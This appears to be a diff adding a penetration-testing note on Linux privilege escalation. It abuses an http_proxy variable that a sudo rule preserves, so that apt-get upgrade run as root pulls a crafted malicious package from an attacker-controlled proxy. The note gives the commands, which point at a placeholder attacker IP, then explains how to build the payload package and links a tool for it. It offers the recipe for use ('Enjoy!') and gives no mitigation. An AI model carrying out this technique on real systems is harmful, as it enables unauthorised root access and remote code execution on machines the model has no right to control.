@@ -1,0 +1,23 @@
+The environment variable http_proxy and https_proxy can be abused to redirect to the server that will host the required (malicious) packages.
+
+Since both environment variables are set with env_keep, this means that they remained persistent despite env_reset.
+
+A web server should be ran on the attacker machine to response to the requests.
+
+# on target machine
+$ export http_proxy="http://<attacker-ip>:8081"
+
+$ sudo -l
+(ALL) NOPASSWD: /usr/bin/apt-get update, (ALL) /usr/bin/apt-get upgrade
+
+$ sudo /usr/bin/apt-get upgrade
+
+On the web server we will need to anaylse the traffic and look for custom package from local and hosted servers with release not being used (not secure - no package check)
+
+then we will need to craft a custom package with the desired command/code to run inside
+
+The following tool can help or this step can also be done manually!
+https://github.com/mthbernardes/Derbie
+
+Enjoy!
+
